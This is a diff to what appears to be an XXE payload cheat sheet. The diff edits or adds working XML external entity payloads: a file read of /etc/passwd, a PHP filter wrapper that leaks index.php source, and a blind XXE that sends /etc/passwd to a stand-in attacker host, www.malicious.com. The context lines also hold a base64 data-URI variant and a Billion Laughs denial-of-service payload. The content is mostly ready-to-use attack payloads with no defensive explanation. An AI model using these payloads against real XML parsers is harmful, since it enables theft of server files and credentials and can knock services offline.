@@ -18,7 +18,7 @@ Classic XXE
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///sys/power/image_size">
+<!ENTITY file SYSTEM "file:///etc/passwd">
 ]>
 <data>&file;</data>
 ```
@@ -27,6 +27,21 @@ Classic XXE Base64 encoded
 ```
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,PCFF...Cg=="> %init; ]><foo/>
 ```
+
+PHP Wrapper inside XXE
+```
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue du CTF</adress>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts> 
+```
+
 
 Deny Of Service - Billion Laugh Attack
 ```
@@ -38,6 +53,18 @@ Deny Of Service - Billion Laugh Attack
 <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
 ]>
 <data>&a4;</data>
+```
+
+Blind XXE
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+]
+>
+<foo>&callhome;</foo>
 ```
 
 
